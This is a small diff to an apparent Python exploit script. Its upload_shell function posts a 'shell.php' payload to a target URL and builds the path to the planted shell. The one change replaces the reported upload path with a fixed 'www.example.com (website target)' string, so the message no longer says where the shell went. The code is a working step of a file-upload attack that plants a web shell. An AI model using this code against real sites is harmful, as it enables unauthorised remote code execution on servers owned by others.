@@ -19,7 +19,7 @@ def upload_shell(url, payload, upload_path):
     files = {'file': ('shell.php', payload)}
     response = requests.post(url, files=files)
     if response.status_code == 200:
-        print(f"Shell uploaded successfully to {upload_path}")
+        print(f"Shell uploaded successfully to www.example.com (website target)")
         # Construct the shell URL
         base_url = url.rstrip('/')
         shell_url = f"{base_url}/{upload_path.lstrip('/')}"
